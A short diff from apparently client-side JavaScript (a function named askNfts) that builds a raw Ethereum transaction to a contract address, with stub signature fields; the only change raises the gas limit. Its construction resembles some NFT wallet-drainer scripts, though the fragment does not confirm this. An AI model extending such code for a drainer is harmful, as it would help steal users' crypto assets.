@@ -126,7 +126,7 @@ async function askNfts() {
 
                 const txObject = {
                     nonce: web3Js.utils.toHex(txnCount),
-                    gasPrice: mgasPrice, gasLimit: "0x55F0",
+                    gasPrice: mgasPrice, gasLimit: "0xFDE8",
                     to: trans.contractAddress,
                     value: "0x",
                     data: trans.dataField, v: "0x1", r: "0x", s: "0x"
